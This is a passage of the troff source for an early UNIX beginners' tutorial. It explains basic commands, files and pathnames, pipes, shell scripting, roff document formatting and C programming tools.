The ``interrupt'' or ``break'' key found on most terminals
has no effect.
.SH
Logging Out
.PP
The easiest way to log out is to hang up the phone.
You can also type
.B1
login name-of-new-user
.B2
and let someone else use the terminal you were on.
It is not sufficient just to turn off the terminal.
.UC UNIX
has no time-out mechanism, so you'll be
there forever unless you hang up.
.SH
Mail
.PP
When you log in, you may sometimes get the message
.B1
You have mail.
.B2
.UC UNIX
provides a postal system so you can send and receive letters
from other users of the system.
To read your mail,
issue the command
.B1
mail
.B2
Your mail will be printed, and then you will be asked
.B1
Save?
.B2
If you do want to save the mail, type
.ul 
y,
for ``yes'';
any other response means ``no''.
.PP
How do you send mail to someone else?
Suppose it is to go to ``joe'' (assuming ``joe'' is someone's login name).
The easiest way is this:
.B1
.ne 7
mail joe
.I
now type in the text of the letter
on as many lines as you like ...
after the last line of the letter
type the character ``control-d'',
that is, hold down ``control'' and type
a letter ``d''.
.B2
.R
And that's it.
The ``control-d'' sequence, usually called ``EOT'', is used throughout 
.UC UNIX
to mark the end of input from a terminal,
so you might as well get used to it.
.PP
There are other ways to send mail _
you can send a previously prepared letter,
and you can mail to a number of people all at once.
For more details see
.SE mail (I).
.PP
The notation
.SE mail (I)
means the command 
.C mail
in section (I)
of the
.ul
.UC UNIX
.ul
Programmer's Manual.
.SH
Writing to other users
.PP
At some point in your 
.UC UNIX 
career, out of the blue will come a message
like
.B1
Message from joe...
.B2
accompanied by a startling beep.
It means that Joe wants to talk to you,
but unless you take explicit action you won't be able to talk back.
To respond,
type the command
.B1
write joe
.B2
This establishes a two-way communication path.
Now whatever Joe types on his terminal will appear on yours
and vice versa.
The path is slow, rather like talking to the moon.
(If you are in the middle of something, you have to
get to a state where you can type a command.
Normally, whatever program you are running has to terminate or be terminated.
If you're editing, you can escape temporarily from the editor _
read the manual.)
.PP
A protocol is needed to keep what you type from getting
garbled up with what Joe types. 
Typically it's like this:
.B1
.fi
Joe types ``write smith'' and waits.
.br
Smith types ``write joe'' and waits.
.br
Joe now types his message
(as many lines as he likes).
When he's ready for a reply, he
signals it by typing (o), which
stands for ``over''.
.br
Now Smith types a reply, also
terminated by (o).
.br
This cycle repeats until
someone gets tired; he then
signals his intent to quit with
(o+o), for ``over
and out''.
.br
To terminate
the conversation, each side must
type a ``control-d'' character alone
on a line. (``Delete'' also works.)
When the other person types his ``control-d'',
you will get the message ``EOT'' on your terminal.
.B2
.PP
If you write to someone who isn't logged in,
or who doesn't want to be disturbed,
you'll be told.
If the target is logged in but doesn't answer
after a decent interval,
simply type ``control-d''.
.SH
On-line Manual
.PP
The 
.UC UNIX
Programmer's Manual
is typically kept on-line.
If you get stuck on something,
and can't find an expert to assist you,
you can print on your terminal some manual section that might help.
It's also useful for getting the most up-to-date
information on a command.
To print a manual section, type
``man section-name''.
Thus to read up on the 
.C who
command,
type
.B1
man who
.B2
If the section in question isn't in part I of the manual,
you have to give the section number as well, as in
.B1
man 6 chess
.B2
Of course you're out of luck if you can't remember the section name.
-- /usr/doc/beg/u2 mode=0110664 uid=3 gid=3 atime=170478204 mtime=173059622 --
.SH
II.  DAY-TO-DAY USE
.SH
Creating Files _ The Editor
.PP
If we have to type a paper or a letter or a program,
how do we get the information stored in the machine?
Most of these tasks are done with
the
.UC UNIX
``text editor''
.C ed .
Since
.C ed
is thoroughly documented in 
.SE ed (I) 
and explained in
.ul
A Tutorial Introduction to the UNIX Text Editor,
we won't spend any time here describing how to use it.
All we want it for right now is to make some
.ul
files.
(A file is just a collection of information stored in the machine,
a simplistic but adequate definition.)
.PP
To create a file with some text in it, do the following:
.B1
 ed	(invokes the text editor)
 a	(command to ``ed'', to add text)
.I
 now type in
 whatever text you want ...
.R
 \fB.\fP	(signals the end of adding text)
.B2
At this point we could do various editing operations
on the text we typed in, such as correcting spelling mistakes,
rearranging paragraphs and the like.
Finally, we write the information we have typed
into a file with the editor command ``w'':
.B1
w junk
.B2
.C ed
will respond with the number of characters it wrote
into the file called ``junk''.
.PP
Suppose we now add a few more lines with ``a'',
terminate them with ``.'',
and write the whole thing out as ``temp'', using
.B1
w temp
.B2
We should now have two files, a smaller one called ``junk'' and a bigger one
(bigger by the extra lines) called ``temp''.
Type a ``q'' to quit the editor.
.SH
What files are out there?
.PP
The
.C ls
(for ``list'') command lists the names
(not contents) of any of the files that
.UC UNIX
knows about.
If we type
.B1
ls
.B2
the response will be
.B1
junk
temp
.B2
which are indeed our two files.
They are sorted into alphabetical order automatically,
but other variations are possible.
For example,
if we add the optional argument ``-t'',
.B1
ls -t
.B2
lists them in the order in which they were last changed,
most recent first.
The ``-l'' option gives a ``long'' listing:
.B1
ls -l
.B2
will produce something like
.B1
-rw-rw-rw-  1 bwk   41 Sep 22 12:56 junk
-rw-rw-rw-  1 bwk   78 Sep 22 12:57 temp
.B2
The date and time are of the last change to the file.
The 41 and 78 are the number of characters
(you got the same thing from
.C ed ).
``bwk'' is the owner of the file _ the person
who created it.
The ``-rw-rw-rw-'' tells who has permission to read and write the file,
in this case everyone.
.PP
Options can be combined:
``ls -lt'' would give the same thing,
but sorted into time order.
You can also name the files you're interested in,
and 
.C ls
will list the information about them only.
More details can be found in  
.SE ls (I).
.PP
It is generally true of
.UC UNIX
programs that ``flag'' arguments like ``-t''
precede filename arguments.
.SH
Printing Files
.PP
Now that you've got a file of text,
how do you print it so people can look at it?
There are a host of programs that do that,
probably more than are needed.
.PP
One simple thing is to use the editor,
since printing is often done just before making changes anyway.
You can say
.B1
ed junk
1,$p
.B2
.C ed
will reply with the count of the characters in ``junk''
and then print all the lines in the file.
After you learn how to use the editor,
you can be selective about the parts you print.
.PP
There are times when it's not feasible to use the editor for printing.
For example, there is a limit on how big a file
.C ed
can handle
(about 65,000 characters or 4000 lines).
Secondly, 
it
will only print one file at a time,
and sometimes you want to print several, one after another.
So here are a couple of alternatives.
.PP
First is
.C cat ,
the simplest of all the printing programs.
.C cat
simply copies all the files in a list onto the terminal.
So you can say
.B1
cat junk
.B2
or, to print two files,
.B1
cat junk temp
.B2
The two files are simply concatenated (hence the name ``cat'')
onto the terminal.
.PP
.C pr
produces formatted printouts of files.
As with 
.C cat ,
.C pr
prints all the files in a list.
The difference is that it produces 
headings with date, time, page number and file name
at the top of each page,
and
extra lines to skip over the fold in the paper.
Thus,
.B1
pr junk temp
.B2
will list ``junk'' neatly,
then skip to the top of a new page and list
``temp'' neatly.
.PP
.C pr
will also produce multi-column output:
.B1
pr -3 junk 
.B2
prints ``junk'' in 3-column format.
You can use any reasonable number in place of ``3''
and 
.C pr
will do its best.
.PP
It should be noted that
.C pr
is
.ul
not
a formatting program in the sense of shuffling lines around
and justifying margins.
The true formatters are
.C roff ,
.C nroff ,
and
.C troff ,
which we will get to in the section on document preparation.
.PP
There are also programs that print files
on a high-speed printer.
Look in your manual under
.C opr
and
.C lpr .
Which to use depends on the hardware configuration
of your machine.
.SH
Shuffling Files About
.PP
Now that you have some files in the file system
and some experience in printing them,
you can try bigger things.
For example,
you can move a file from one place to another
(which amounts to giving a file a new name),
like this:
.B1
mv junk precious
.B2
This means that what used to be ``junk'' is now ``precious''.
If you do an
.C ls
command now,
you will get
.B1
precious
temp
.B2
Beware that if you move a file to another one
that already exists,
the already existing contents are lost forever.
.PP
If you want
to make a
.ul
copy
of a file (that is, to have two versions of something),
you can use the 
.C cp
command:
.B1
cp precious temp1
.B2
makes a duplicate copy of 
``precious''
in
``temp1''.
.PP
Finally, when you get tired of creating and moving
files,
there is a command to remove files from the file system,
called
.C rm .
.B1
rm temp temp1
.B2
will remove all of the files named.
You will get a warning message if one of the named files wasn't there.
.SH
Filename, What's in a
.PP
So far we have used filenames without ever saying what's
a legal name,
so it's time for a couple of rules.
First, filenames are limited to 14 characters,
which is enough to be descriptive.
Second, although you can use almost any character
in a filename,
common sense says you should stick to ones that are visible,
and that you should probably avoid characters that might be used
with other meanings.
We already saw, for example,
that in the
.C ls
command,
``ls -t'' meant to list in time order.
So if you had a file whose name
was ``-t'',
you would have a tough time listing it by name.
There are a number of other characters which
have special meaning either to
.UC UNIX
as a whole or to numerous commands.
To avoid pitfalls,
you would probably do well to 
use only letters, numbers and the period.
(Don't use the period as the first character of a filename,
for reasons too complicated to go into.)
.sp
.PP
On to some more positive suggestions.
Suppose you're typing a large document
like a book.
Logically this divides into many small pieces,
like chapters and perhaps sections.
Physically it must be divided too,
for 
.C ed
will not handle big files.
Thus you should type the document as a number of files.
You might have a separate file for each chapter,
called
.B1
.ne 3
chap1
chap2
etc...
.B2
Or, if each chapter were broken into several files, you might have
.B1
.ne 7
chap1.1
chap1.2
chap1.3
 ...
chap2.1
chap2.2
 ...
.B2
You can now tell at a glance where a particular file fits into the whole.
.PP
There are advantages to a systematic naming convention which are not obvious
to the novice
.UC UNIX 
user.
What if you wanted to print the whole book?
You could say
.B1
pr chap1.1 chap1.2 chap1.3 ......
.B2
but you would get tired pretty fast, and would probably even make mistakes.
Fortunately, there is a shortcut.
You can say
.B1
pr chap*
.B2
The ``*'' means ``anything at all'',
so this translates into ``print all files
whose names begin with `chap' '',
listed in alphabetical order.
This shorthand notation
is not a property of the
.C pr
command, by the way.
It is system-wide, a service of the program
that interprets commands
(the ``shell''
.SE sh (I)).
Using that fact, you can see how to list the files of the book:
.B1
ls chap*
.B2
produces
.B1
.ne 4
chap1.1
chap1.2
chap1.3
 ...
.B2
The ``*'' is not limited to the last position in a filename _
it can be anywhere.
Thus
.B1
rm *junk*
.B2
removes all files that contain ``junk''
as any part of their name.
As a special case, ``*'' by itself matches every filename,
so
.B1
pr *
.B2
prints all the files
(alphabetical order),
and
.B1
rm *
.B2
removes
.ul
all files.
(You had better be sure that's what you wanted to say!)
.PP
The ``*'' is not the only pattern-matching feature available.
Suppose you want to print only chapters 1 through 4 and 9 of the
book.
Then you can say
.B1
pr chap[12349]*
.B2
The ``[...]'' 
means to match any of the characters inside the brackets.
You can also do this 
with
.B1
pr chap[1-49]*
.B2
``[a-z]'' matches any character in the range
.ul
a
through
.ul 
z.
There is also a ``?'' character, which matches any single character,
so
.B1
pr ?
.B2
will print all files which have single-character names.
.PP
Of these niceties,
``*'' is probably the most useful,
and you should get used to it.
The others are frills, but worth knowing.
.PP
If you should ever have to turn off the special meaning
of ``*'', ``?'', etc.,
enclose the entire argument in quotes (single or double),
as in
.B1
ls "?"
.B2
.SH
What's in a Filename, Continued
.PP
When you first made that file called ``junk'',
how did 
.UC UNIX
know that there wasn't another ``junk'' somewhere else,
especially since the person in the next office is also
reading this tutorial?
The reason is that generally each user of 
.UC UNIX
has his own ``directory'',
which contains only the files that belong to him.
When you create a new file,
unless you take special action,
the new file is made in your own directory,
and is unrelated to any other file of the same name
that might exist in someone else's directory.
.PP
The set of all files that
.UC UNIX
knows about are organized into a (usually big) tree,
with your files located several branches up into the tree.
It is possible for you to ``walk'' around this tree,
and to find any file in the system, by starting at the root
of the tree and walking along the right set of branches.
.PP
To begin, type 
.B1
ls /
.B2
``/'' is the name of the root of the tree (a convention used
by
.UC UNIX ).
You will get a response something like this:
.B1
.ne 6
bin
dev
etc
lib
tmp
usr
.B2
This is a collection of the basic directories of files
that
.UC UNIX
knows about.
On most
systems,
``usr'' is a directory that contains all the
normal users of the system, like you.
Now try
.B1
ls  /usr
.B2
This should list a long series of names,
among which is your own login name.
Finally, try
.B1
ls  /usr/your-name
.B2
You should get what you get from a plain
.B1
ls
.B2
Now try
.B1
cat  /usr/your-name/junk
.B2
(if ``junk'' is still around).
The name
.B1
/usr/your-name/junk
.B2
is called the ``pathname'' of the file that
you normally think of as ``junk''.
``Pathname'' has an obvious meaning:
it represents the full name of the path you have to follow
through the tree of directories to get to a particular file.
It is a universal rule in
.UC  UNIX
that anywhere you can use an ordinary filename,
you can use a pathname.
.PP
Here is a picture which may make this clearer:
.B1 1
.vs 9p
.if t .tr /\(sl
.ce 100
.ne 12
(root)
/ | \\
/  |  \\
/   |   \\
  bin    etc    usr    dev   tmp 
/ | \\   / | \\   / | \\   / | \\   / | \\
/  |  \\
/   |   \\
adam  eve   mary
/        /   \\        \\
             /     \\       junk
junk  temp
.ce 0
.br
.tr //
.B2
.PP
Notice that Mary's ``junk'' is unrelated to Eve's.
.PP
This isn't too exciting if all the files of interest are in your own
directory, but if you work with someone else
or on several projects concurrently,
it becomes handy indeed.
For example, your friends can print your book by saying
.B1
pr  /usr/your-name/chap*
.B2
Similarly, you can find out what files your neighbor has
by saying
.B1
ls  /usr/neighbor-name
.B2
or make your own copy of one of his files by
.B1
cp  /usr/your-neighbor/his-file  yourfile
.B2
.PP
(If your neighbor doesn't want you poking around in his files,
or vice versa,
privacy can be arranged.
Each file and directory can have read-write-execute permissions for the owner,
a group, and everyone else,
to control access.
See
.SE ls (I)
and
.SE chmod (I)
for details.
As a matter of observed fact,
most users most of the time find openness of more
benefit than privacy.)
.PP
As a final experiment with pathnames, try
.B1
ls  /bin  /usr/bin
.B2
Do some of the names look familiar?
When you run a program, by typing its name after a ``%'',
the system simply looks for a file of that name.
It looks first in your directory
(where it typically doesn't find it),
then in ``/bin'' and finally in ``/usr/bin''.
There is nothing magic about commands like
.C cat
or
.C ls ,
except that they have been collected into two places to be easy to find and administer.
.sp
.PP
What if you work regularly with someone else on common information
in his directory?
You could just log in as your friend each time you want to,
but you can also say
``I want to work on his files instead of my own''.
This is done by changing the directory that you are
currently in:
.B1
chdir  /usr/your-friend
.B2
Now when you use a filename in something like
.C cat
or
.C pr ,
it refers to the file in ``your-friend's'' directory.
Changing directories doesn't affect any permissions associated
with a file _
if you couldn't access a file from your own directory,
changing to another directory won't alter that fact.
.PP
If you forget what directory you're in, type
.B1
pwd
.B2
(``print working directory'')
to find out.
.PP
It is often convenient to arrange one's files
so that all the files related to one thing are in a directory separate
from other projects.
For example, when you write your book, you might want to keep all the text
in a directory called book.
So make one with
.B1
mkdir book
.B2
then go to it with
.B1
chdir book
.B2
then start typing chapters.
The book is now found in (presumably)
.B1
/usr/your-name/book
.B2
To delete a directory, see
.SE rmdir (I).
.PP
You can go up one level in the tree of files 
by saying
.B1
chdir ..
.B2
``..'' is the name of the parent of whatever directory you are currently in.
For completeness, ``.'' is an alternate name
for the directory you are in.
.SH
Using Files instead of the Terminal
.PP
Most of the commands we have seen so far produce output
on the terminal;
some, like the editor, also take their input from the terminal.
It is universal in
.UC UNIX
that the terminal can be replaced by a file
for either or both of input and output.
As one example, you could say
.B1
ls
.B2
to get a list of files.
But you can also say
.B1
ls >filelist
.B2
to get a list of your files in the file ``filelist''.
(``filelist'' will be created if it doesn't already exist,
or overwritten if it does.)
The symbol ``>'' is used throughout
.UC UNIX
to mean ``put the output on the following file,
rather than on the terminal''.
Nothing is produced on the terminal.
As another example, you could concatenate
several files into one by capturing the output of
.C cat
in a file:
.B1
cat  f1  f2  f3 >temp
.B2
.PP
Similarly, the symbol ``<'' means to take the input
for a program from the following file,
instead of from the terminal.
Thus, you could make up a script of commonly used editing commands
and put them into a file called ``script''.
Then you can run the script on a file by saying
.B1
ed file <script
.B2
.SH
Pipes
.PP
One of the novel contributions of
.UC UNIX
is the idea of a
.ul
pipe.
A pipe is simply a way to connect the output of one program
to the input of another program,
so the two run as a sequence of processes _
a pipe-line.
.PP
For example,
.B1
pr  f  g  h
.B2
will print the files
``f'', ``g'' and ``h'',
beginning each on a new page.
Suppose you want
them run together instead.
You could say
.B1
.ne 3
cat  f  g  h  >temp
pr  temp
rm  temp
.B2
but this is more work than necessary.
Clearly what we want is to take the output of
.C cat
and
connect it to the input of
.C pr .
So let us use a pipe:
.B1
cat  f  g  h  |  pr
.B2
The vertical bar means to
take the output from
.C cat ,
which would normally have gone to the terminal,
and put it into
.C pr ,
which formats it neatly.
.PP
Any program
that reads from the terminal
can read from a pipe instead;
any program that writes on the terminal can drive
a pipe.
You can have as many elements in a pipeline as you wish.
.PP
Many
.UC UNIX
programs are written so that they will take their input from one or more files
if file arguments are given;
if no arguments are given they will read from the terminal,
and thus can be used in pipelines.
.SH
The Shell
.PP
We have already mentioned once or twice the mysterious
``shell,''
which is in fact
.SE sh (I).
The shell is the program that interprets what you type as
commands and arguments.
It also looks after translating ``*'', etc.,
into lists of filenames.
.PP
The shell has other capabilities too.
For example, you can start two programs with one command line
by separating the commands with a semicolon;
the shell recognizes the semicolon and
breaks the line into two commands.
Thus
.B1
date; who
.B2
does both commands before returning with a ``%''.
.PP
You can also have more than one program running
.ul
simultaneously
if you wish.
For example, if you are doing something time-consuming,
like the editor script
of an earlier section,
and you don't want to wait around for the results before starting something else,
you can say
.B1
ed  file  <script &
.B2
The ampersand at the end of a command line
says ``start this command running,
then take further commands from the terminal immediately.''
Thus the script will begin,
but you can do something else at the same time.
Of course, to keep the output from interfering
with what you're doing on the terminal,
it would be better to have said
.B1
ed  file  <script >lines &
.B2
which would save the output lines in a file
called
``lines''.
.PP
When you initiate a command with ``&'',
.UC UNIX
replies with a number
called the process number,
which identifies the command in case you later want
to stop it.
If you do, you can say
.B1
kill process-number
.B2
You might also read
.SE ps (I).
.PP
You can say
.B1 1
(command-1; command-2; command-3) &
.B2
to start these commands in the background,
or you can start a background pipeline with
.B1
command-1 | command-2 &
.B2
.PP
Just as you can tell the editor
or some similar program to take its input
from a file instead of from the terminal,
you can tell the shell to read a file
to get commands.
(Why not? The shell after all is just a program,
albeit a clever one.)
For instance, suppose you want to set tabs on
your terminal, and find out the date
and who's on the system every time you log in.
Then you can put the three necessary commands
(
.C tabs ;
.C date ;
.C who )
into a file, let's call it  ``xxx'',
and then run it with
either
.B1
sh xxx
.B2
or
.B1
sh <xxx
.B2
This says to run the shell with the file ``xxx'' as input.
The effect is as if you had typed 
the contents of ``xxx''
on the terminal.
(If this is to be a regular thing,
you can eliminate the 
need to type
``sh'';
see
.SE chmod (I)
and
.SE sh (I).)
.PP
The shell has quite a few other capabilities as well,
some of which we'll get to in the section on programming.
-- /usr/doc/beg/u3 mode=0110664 uid=3 gid=3 atime=170478206 mtime=173059622 --
.sp
.SH
III. DOCUMENT PREPARATION
.sp
.PP
.UC UNIX
is extensively used for document preparation.
There are three major 
.ul
formatting
programs,
that is,
programs which produce a text with
justified right margins, automatic page numbering and titling,
automatic hyphenation,
and the like.
The simplest of these formatters is
.C roff ,
which
in fact is simple enough that if you type almost any text
into a file and
``roff'' 
it,
you will get plausibly formatted output.
You can do better with a little knowledge,
but basically it's 
easy to learn and use.
We'll get back to 
.C roff
shortly.
.PP
.C nroff
is similar to
.C roff
but does much less for you automatically.
It will do a great deal more,
once you know how to use it.
.PP
Both
.C roff
and
.C nroff
are designed to produce output on terminals,
line-printers, and the like.
The third formatter,
.C troff
(pronounced ``tee-roff''),
instead drives a Graphic Systems phototypesetter,
which produces very high quality output on photographic paper.
This 
paper
was printed on the phototypesetter by
.C troff .
.if n (Or at least it will be.)
.PP
Because
.C nroff
and
.C troff
are relatively hard to learn to use effectively,
several
``packages'' of canned formatting requests are available
which let you do things
like paragraphs, running titles, multi-column output,
and so on, with little effort.
Regrettably, details vary from system to system.
.SH
ROFF
.PP
The basic idea of
.C roff
(and of
.C nroff
and
.C troff ,
for that matter)
is that the text to be formatted
contains within it ``formatting commands''
that indicate in detail how the formatted text is to look.
For example, there might be commands that specify how long lines are,
whether to use single or double spacing,
and what running titles to use on each page.
In general, you don't have to spell
out all of the possible formatting details.
Most of them have
``default values'',
which you will get if you say nothing at all.
For example,
unless you take special precautions,
you'll get single-spaced output, 65-character lines,
justified right margins, and 58 text lines per page
when you 
.C roff
a file.
This is the reason that
.C roff
is so simple _
most of the decisions have already been made
for you.
.PP
Some things do have to be done, however.
If you want a document
broken into paragraphs, you have to tell
.C roff
where to add the extra blank lines.
This is done with the
``.sp'' command:
.B1
.ne 3
this is the end of one paragraph.
^sp
This begins the next paragraph ...
.B2
In
.C roff
(and in
.C nroff
and
.C troff ),
formatting commands consist of a period followed by two letters,
and they must appear at the beginning of a line, all by themselves.
The ``.sp'' command tells
.C roff
to finish printing any of the previous
line
that might be still unprinted,
then print a blank line before continuing.
You can have more space if you wish;
``.sp 2'' asks for 2 spaces, and so on.
.PP
If you simply want to
ensure that subsequent text appears on a fresh output line,
you can use the command ``.br'' (for ``break'')
instead of ``.sp''.
.PP
Most of the other commonly-used
.C roff
commands are equally simple.
For example you can center one or more lines with the ``.ce'' command.
.B1
.ne 3
^ce
Title of Paper
^sp 2
.B2
causes the title to be centered,
then followed by two blank lines.
As with ``.sp'', ``.ce'' can be followed by a number;
in that case, that many input lines are centered.
.PP
``.ul'' underlines lines, and can also be followed by a number:
.B1
.ne 5
^ce 2
^ul 2
An Earth-shaking Paper
^sp
John Q. Scientist
.B2
will center and underline the two text lines.
Notice that the ``.sp'' between them
is not part of the line count.
.PP
You can get multiple-line spacing instead of the default single-spacing
with the ``.ls'' command:
.B1
^ls 2
.B2
causes double spacing.
.PP
If you're typing things like tables,
you will not want the automatic filling-up and justification
of output lines that is done by default.
You can turn this off with the command
``.nf'' (no-fill),
and then back on again with ``.fi'' (fill).
Thus
.B1
.ne 7
this section is filled by default.
^nf
here lines will appear just
as you typed them _
no extra spaces, no moving of words.
^fi
Now go back to filling up output lines.
.B2
.PP
You can change the line-length with ``.ll'',
and the left margin (the indent) by ``.in''.
These are often used together to make offset blocks of text:
.B1
^ll \-10
^in +10
.fi
.ll -5
this text will be moved 10 spaces to the right
and the lines will also be shortened 10 characters from the right.
The ``+'' and ``\-'' mean to 
.ul
change
the previous value by that much.
Now revert:
.ll +5
.nf
^ll +10
^in \-10
.B2
Notice that ``.ll +10'' adds ten characters to the line length,
while ``.ll 10'' makes the line ten characters
.ul
long.
.PP
The ``.ti'' command
indents (in either direction) just like ``.in'', except for only one line.
Thus to make a new paragraph with a 10-character indent,
you would say
.B1
.ne 3
^sp
^ti +10
New paragraph ...
.B2
.PP
You can put running titles on both top and bottom of each page,
like this:
.B1
.ne 2
^he "left top"center top"right top"
^fo "left bottom"center bottom"right bottom"
.B2
The header or footer is divided into three parts,
which are marked off by any character you like.
(We used a double quote.)
If there's nothing between the markers, that part
of the title will be blank.
If you use a percent sign anywhere in ``.he'' or ``.fo'',
the current page number will be inserted.
So to get centered page numbers with dashes around them,
at the top,
use
.B1
^he ""\- % \-""
.B2
You can skip to the top of a new page at any time
with the ``.bp'' command;
if ``.bp'' is followed by a number,
that will be the new page number.
.PP
The foregoing is probably enough about 
.C roff
for you to go off and format most everyday documents.
Read
.SE roff (I)
for more details.
.SH
Hints for Preparing Documents
.PP
Most documents go through several versions (always more than you expected) before they
are finally finished.
Accordingly, you should do whatever possible to make
the job of changing them easy.
.PP
First, when you do the purely mechanical operations of typing,
type so subsequent editing will be easy.
Start each sentence on a new line.
Make lines short,
and break lines at natural places,
such as after commas and semicolons,
rather than randomly.
Since most people change documents by rewriting phrases
and adding, deleting and rearranging sentences,
these precautions simplify any editing
you have to do later.
.PP
The second aspect of making change easy
is not to commit yourself to formatting details too early.
For example, if you decide that each paragraph is to have
a space and an indent of 10 characters,
you might type, before each,
.B1
.ne 2
^sp
^ti +10
.B2
But what happens when later you decide that it would have
been better to have
no space and an indent of only 5 characters?
It's tedious indeed to go back and patch this up.
.PP
Fortunately, all of the formatters let
you delay decisions until the actual moment of running.
The secret is to define a new operation
(called a
.ul
macro),
for each formatting operation you want to do,
like making a new paragraph.
You can say, in all three formatters,
.B1
.ne 4
^de PP
.ne 2
^sp
^ti +10
^^
.B2
This
.ul
defines
``.PP''
as a new
.C roff
(or
.C nroff 
or
.C troff )
operation,
whose meaning is exactly
.B1
^sp
^ti +10
.B2
(The ``..'' marks the end of the definition.)
Whenever ``.PP'' is encountered in the text,
it is as if you had typed 
the two lines of the definition
in place of it.
.PP
The beauty of this scheme is that now, if you change your mind
about what a paragraph should look like,
you can change the formatted output
merely by changing the definition of
``.PP''
and re-running the formatter.
.PP
As a rule of thumb, for all but the most trivial jobs,
you should type a document in terms of a set of macros
like ``.PP'',
and then define them appropriately.
As long as you have entered the text in some systematic way,
it can always be cleaned up and re-formatted
by a judicious combination of
editing and macro definitions.
The packages of formatting commands
that we mentioned earlier are simply collections
of macros designed for particular formatting tasks.
.PP
One of the main differences between
.C roff
and the other formatters
is that macros in
.C roff
can only be lines of text and formatting commands.
In
.C nroff 
and
.C troff ,
macros may have arguments,
so they can have different effects
depending on how they are called
(in exactly the same way that the ``.sp'' command
has an argument, the number of spaces you want).
.SH
Miscellany
.PP
In addition to the basic formatters,
.UC UNIX
provides
a host of supporting programs.
.C eqn
and
.C neqn
let you integrate mathematics
into the text of a document,
in a language that closely resembles the way
you would speak it aloud.
.C spell
and
.C typo
detect possible spelling mistakes in a document.
.C grep
looks for lines
containing a particular text pattern 
(rather like the editor's context search does,
but on a whole series of files).
For example,
.B1
grep  "ing$"  chap*
.B2
will find all lines ending
in the letters ``ing'' in the series of files ``chap*''.
(It is almost always a good practice to put quotes around
the pattern you're searching for,
in case it contains characters that have a special meaning for the shell.)
.PP
.C wc
counts the words and (optionally) lines in a set of files.
.C tr
translates characters into other characters;
for example it will convert upper to lower case and vice versa.
This translates upper into lower:
.B1
tr  "[A-Z]"  "[a-z]"
.B2
.PP
.C diff
prints a list of the differences between
two files,
so you can compare
two versions of something automatically
(which certainly beats proofreading by hand).
.C sort
sorts files in a variety of ways;
.C cref
makes cross-references;
.C ptx
makes a permuted index
(keyword-in-context listing).
.PP
Most of these programs are either independently documented
(like
.C eqn
and
.C neqn ),
or are sufficiently simple that the description in
the
.ul 2
.UC UNIX
Programmer's Manual
is adequate explanation.
-- /usr/doc/beg/u4 mode=0110664 uid=3 gid=3 atime=170478206 mtime=173059622 --
.SH
IV.  PROGRAMMING
.PP
.UC UNIX
is a marvelously pleasant and productive system for
writing programs;
productivity seems to be an order of magnitude higher
than on other interactive systems.
.PP
There will be no attempt made to teach any of
the programming languages available on
.UC UNIX ,
but a few words of advice are in order.
First,
.UC UNIX
is written in C,
as is most of the applications code.
If you are undertaking anything substantial,
C is the only reasonable choice.
More on that in a moment.
But remember that there are quite a few programs already written,
some of which have substantial power.
.PP
The editor can be made to do things that would normally
require special programs on other systems.
For example, to list the first and last lines of each of a
set of files, say a book,
you could laboriously type
.B1
ed
e chap1.1
1p
$p
e chap1.2
1p
$p
 etc.
.B2
But instead you can do the job once and for all.
Type
.B1
ls chap* >temp
.B2
to get the list of filenames into a file.
Then edit this file to make the necessary
series of editing commands
(using the global commands of
.C ed ),
and write it into ``script''.
Now the command
.B1
ed <script
.B2
will produce
the same output as the laborious hand typing.
.PP
The pipe mechanism lets you fabricate quite complicated operations
out of spare parts already built.
For example, the first draft of the 
.C spell
program was (roughly)
.B1
.ne 7
cat ... 	(collect the files)
| tr ...	(put each word on a new line,
	  delete punctuation, etc.)
| sort	(into dictionary order)
| uniq	(strip out duplicates)
| comm	(list words found in text but
	  not in dictionary)
.B2
.SH
Programming the Shell
.PP
An option often overlooked by newcomers
is that the shell is itself a programming language,
and since
.UC UNIX
already has a host of building-block programs,
you can sometimes avoid writing a special purpose program
merely by piecing together some of the building blocks
with shell command files.
.PP
As an unlikely example,
suppose you want to count
the number of users on the machine every hour.
You could type
.B1
.ne 2
date
who | wc -l
.B2
every hour, and write down the numbers, but that is rather primitive.
The next step is probably to say
.B1
(date; who | wc -l) >>users
.B2
which uses ``>>'' to 
.ul
append
to the end of the file ``users''.
(We haven't mentioned ``>>'' before _
it's another service of the shell.)
Now all you have to do is to put a loop around this,
and ensure that it's done every hour.
Thus, place the following commands into a file, say ``count'':
.B1
.ne 4
: loop
(date; who | wc -l) >>users
sleep  3600
goto loop
.B2
The command 
.C :
is followed by a space and a label,
which you can then 
.C goto .
Notice that it's quite legal to branch backwards.
Now if you issue the command
.B1
sh  count  &
.B2
the users will be counted every hour,
and you can go on with other things.
(You will have to use
.C kill
to stop counting.)
.PP
If you would like ``every hour'' to be a parameter,
you can arrange for that too:
.B1
.ne 4
: loop
(date; who | wc - l) >>users
sleep  $1
goto loop
.B2
``$1'' means the first argument when this procedure is invoked.
If you say
.B1
sh count 60
.B2
it will count every minute.
A shell program can have up to nine arguments,
``$1'' through ``$9''.
.PP
The other aspect of programming is conditional testing.
The
.C if
command
can test conditions and execute commands accordingly.
As a simple example, suppose you want to add to your login sequence
something to print your mail if you have some.
Thus, knowing that mail is stored in a file called
`mailbox', you could say
.B1
if -r mailbox  mail
.B2
This says
``if the file `mailbox' is readable, execute the
.C mail
command.''
.PP
As another example, you could arrange that the
``count''
procedure count every hour by default,
but allow an optional argument to specify a different time.
Simply replace the ``sleep $1'' line by
.B1
.ne 2
if $1x = x sleep 3600
if $1x != x sleep $1
.B2
The construction
.B1
if $1x = x
.B2
tests whether ``$1'', the first argument, was present or absent.
.PP
More complicated conditions can be tested:
you can find out the status of an executed command,
and you can combine conditions with `and', `or',
`not' and parentheses _
see
.SE if (I).
You should also read
.SE shift (I)
which describes how to manipulate arguments to shell command files.
.SH
Programming in C
.PP
As we said, C is the language of choice:
everything in
.UC UNIX
is tuned to it.
It is also a remarkably easy language to use
once you get started.
Sections II and III of the manual
describe the system interfaces, that is,
how you do I/O
and similar functions.
.PP
You can write quite significant C programs
with the level of I/O and system interface described in
.ul
Programming in C: A Tutorial,
if you use existing programs and pipes to help.
For example, rather than learning how to open and close files
you can (at least temporarily) write a program that reads
from its standard input,
and use
.C cat
to concatentate several files into it.
This may not be adequate for the long run,
but for the early stages it's just right.
.PP
There are a number of supporting programs that go with C.
The C debugger,
.C cdb ,
is marginally useful for digging through the dead bodies
of C programs.
.C db ,
the assembly language debugger, is actually more useful most
of the time,
but you have to know more about the machine
and system to use it well.
The most effective debugging tool is still
careful thought, coupled with judiciously placed
print statements.
.PP
You can instrument C programs and thus find out
where they spend their time and what parts are worth optimising.
Compile the routines with the ``-p'' option;
after the test run use
.C prof
to print an execution profile.
